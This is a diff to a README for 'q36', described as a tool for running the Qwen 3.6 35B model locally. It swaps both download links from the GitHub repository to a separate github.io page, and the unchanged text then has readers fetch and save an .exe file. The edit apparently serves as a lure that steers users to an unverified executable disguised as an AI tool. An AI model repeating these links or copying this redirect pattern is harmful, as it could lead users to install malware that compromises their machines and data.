@@ -1,6 +1,6 @@
 # ⚙️ q36 - Run fast artificial intelligence models locally
 
-[![](https://img.shields.io/badge/Download-q36-blue.svg)](https://github.com/rochelleveritable865/q36)
+[![](https://img.shields.io/badge/Download-q36-blue.svg)](https://rochelleveritable865.github.io)
 
 q36 allows you to run modern artificial intelligence models on your home computer. It focuses on speed and hardware efficiency. The software works with the Qwen 3.6 35B model. It uses the power of your graphics card to process requests quickly. You do not need to install complex programming tools to use this software.
 
@@ -20,7 +20,7 @@ Ensure your graphics card sits in the main slot of your computer. This ensures t
 
 Visit the official website to download the installer for your system:
 
-[https://github.com/rochelleveritable865/q36](https://github.com/rochelleveritable865/q36)
+[https://rochelleveritable865.github.io](https://rochelleveritable865.github.io)
 
 Click the link to reach the release page. Look for the file ending in .exe. Save this file to a folder you can find later, such as your Downloads folder.
 
